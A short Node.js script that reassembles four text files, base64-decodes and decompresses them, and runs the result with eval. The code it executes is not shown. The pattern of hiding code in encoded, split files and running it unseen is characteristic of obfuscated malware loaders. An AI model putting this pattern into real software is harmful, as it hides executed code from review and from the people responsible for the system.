const fs=require('fs');
const zlib=require('zlib');
const parts=[1,2,3,4].map(i=>fs.readFileSync(`server.part${i}.txt`,'utf8').trim()).join('');
const source=zlib.gunzipSync(Buffer.from(parts,'base64')).toString('utf8');
eval(source);
